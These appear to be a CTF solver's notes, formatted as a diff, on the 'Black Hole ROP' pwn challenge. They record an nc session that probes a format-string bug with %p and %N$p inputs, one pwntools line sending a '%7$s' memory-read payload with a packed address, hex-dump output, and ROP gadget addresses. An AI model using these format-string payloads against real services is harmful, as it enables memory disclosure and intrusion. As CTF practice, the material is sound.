@@ -1,0 +1,212 @@
+mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_Blackhole_ROP$ nc 0.cloud.chals.io 12655
+                                                                           
+                                                      llllooooooolllllll   
+                                              llloodddddddddddddoooooooooll
+                                       lllloooddddddddddddddddooooooooooool
+                                  llooodddddddddxxxxxkkkkkkxxddoooooooolll 
+                             lloooddddddxxxxkOOOOOO000000OOkxxdddoooolllll 
+                        llloodddddxxxkkOOO0000000KKKKKK000Okxddddoooolll   
+                     lllooddxxxxkkOOOOO0000OOOOOOOOO00KK00Oxddddddoooll    
+                  llloodxxxxkkOOOOOOkkxdddoooolllllloxO000kxddoddddoll     
+               lloooodxkkkOOOOOOkdol         ''....'  x00Oxdddoooooll      
+             looooodxkOOOOOkxdol   '''.........     . kOkxddoooooll        
+          llooooddxkOO00Okdl   '.........            xOkxddooooool         
+        loooooddxkOOOOkxo  '..... ....            . xkxdoooooool           
+      looooddxxkkOOOOxl  .......                . oxxdooooolll             
+    loddddddxxxkOOOkd  ...                    ' oxxdooooooll               
+   lodddoddxxxkOO0Oxl '.                  .' ldxddoooooolll                
+  loodddoddxxkkOOOOxo  ..           ..'   odddddoooooooll                  
+ lodddddoddxxkkkOOOOkdl  '......'   odxxdddddoooooolll                     
+lloddddddooddxxxxkkkOkkkkxxxddddxxxxxxdddooooollll                         
+llooddddddddddddxxxxxxxxxxxdddddddddddoooolllll                            
+llloooooooooooddddxxxxxxxdddddddoooollll l                                 
+ooooooooddddddddxddddddddddooolll  lll                                     
+looooooooooooooooooooooollll                                               
+    llllllooooolllll                                                       
+       lllll                                                               
+----------------------------------------------------------------------------
+ ~ Welcome to Black Hole ROP ~ 
+----------------------------------------------------------------------------
+<<< Address of syscall, ret    : 0x4013bb
+<<< Address of writable memory : 0x666000
+<<< Address of pop rax, ret    : 0x4013c5
+----------------------------------------------------------------------------
+
+>>> AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+
+<<< You say: AAAAAAAA,0x7fff514c3f80,(nil),(nil),0x7fff514c60a0,(nil),0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x401300,0x7fb572342115,0x401480,0x5b7b4dad857e6eeb,0x401080,(nil),(nil),(nil),0xa485ef3544be6eeb
+
+
+>>> 123456789012345678901234567890123456789 
+
+<<< You say: 123456789012345678901234567890123456789
+>>> 123456789012345678901234567890123456789a
+
+<<< You say: 123456789012345678901234567890123456789a----------------------------------------------------------------------------
+<<< Address of syscall, ret    : 0x4013bb
+<<< Address of writable memory : 0x666000
+<<< Address of pop rax, ret    : 0x4013c5
+----------------------------------------------------------------------------
+
+>>> 123456789012345678901234567890123456789z
+
+<<< You say: 123456789012345678901234567890123456789z----------------------------------------------------------------------------
+<<< Address of syscall, ret    : 0x4013bb
+<<< Address of writable memory : 0x666000
+<<< Address of pop rax, ret    : 0x4013c5
+----------------------------------------------------------------------------
+
+>>> %10$p
+
+<<< You say: 0x7a39383736353433
+>>> %11$p
+
+<<< You say: 0x401473
+>>> %12$p
+
+<<< You say: (nil)
+>>> %13$p
+
+<<< You say: 0x7f7eaefed7ed
+>>> %14$p
+
+<<< You say: 0x7ffe5c1097b8
+>>> %15$p
+
+<<< You say: 0x100000000
+>>> %16$p
+
+<<< You say: 0x4013ca
+>>> %17$p
+
+<<< You say: 0x7f7eaf193115
+>>> %18$p
+
+<<< You say: 0x401480
+>>> %19$p
+
+<<< You say: 0xeb2dc67918016afa
+>>> %20$p
+
+<<< You say: 0x401080
+>>> %21$p
+
+<<< You say: (nil)
+>>> %22$p
+
+<<< You say: (nil)
+>>> %23$p
+
+<<< You say: (nil)
+>>> %24$p
+
+<<< You say: 0x14d17e5835a16afa
+>>> %25$p
+
+<<< You say: 0x15d09b84b74d6afa
+>>> %26$p
+
+<<< You say: 0x7f7e00000000
+>>> %27$p
+
+<<< You say: (nil)
+>>> %28$p
+
+<<< You say: (nil)
+>>> %29$p
+
+<<< You say: 0x1
+>>> %30$p
+
+<<< You say: 0x7ffe5c1097b8
+>>> %31$p
+
+<<< You say: 0x7ffe5c1097c8
+>>> %32$p
+
+<<< You say: 0x7f7eaf1cb220
+>>> $33$p
+
+<<< You say: $33$p
+>>> %33$p
+
+<<< You say: (nil)
+>>> %34$p
+
+<<< You say: (nil)
+>>> %35$p
+
+<<< You say: 0x401080
+>>> %36$p
+
+<<< You say: 0x7ffe5c1097b0
+
+>>> %36$p
+
+<<< You say: 0x7ffe6f2a9970
+>>> %37$p
+
+<<< You say: (nil)
+>>> %38$p
+
+<<< You say: (nil)
+>>> %39$p
+
+<<< You say: 0x4010aa
+>>> %40$p
+
+<<< You say: 0x7ffe6f2a9968
+>>> %41$p
+
+<<< You say: 0x1c
+>>> %42$p
+
+<<< You say: 0x1
+>>> %43$p
+
+<<< You say: 0x7ffe6f2aaf03
+>>> %44$p
+
+<<< You say: (nil)
+>>> %45$p
+
+<<< You say: 0x7ffe6f2aaf0e
+>>> %46$p
+
+<<< You say: 0x7ffe6f2aaf26
+>>> %47$p
+
+<<< You say: 0x7ffe6f2aaf3c
+>>> %48$p
+
+<<< You say: 0x7ffe6f2aaf47
+>>> %49$p
+
+<<< You say: 0x7ffe6f2aaf52
+>>> %50$p
+
+<<< You say: 0x7ffe6f2aaf94
+
+
+0x401080 が _start
+
+0x4013ca が main
+
+
+s.sendline("%7$s----" + p64(0x4014c2))
+
+>>> [DEBUG] Received 0x37 bytes:
+    00000000  0a 3c 3c 3c  20 59 6f 75  20 73 61 79  3a 20 ff 14  │·<<<│ You│ say│: ··│
+    00000010  df 48 83 c3  01 48 39 dd  75 ea 48 83  c4 08 5b 5d  │·H··│·H9·│u·H·│··[]│
+    00000020  41 5c 41 5d  41 5e 41 5f  c3 0f 1f 2d  2d 2d 2d c2  │A\A]│A^A_│···-│---·│
+    00000030  14 40 0a 3e  3e 3e 20                               │·@·>│>> │
+    00000037
+
+
+0x4014db # pop rdi; ret
+
+0x4014d9 # pop rsi; pop r15; ret
+
+0x4013c5 # pop rax, ret
+
+0x4013bb # syscall, ret
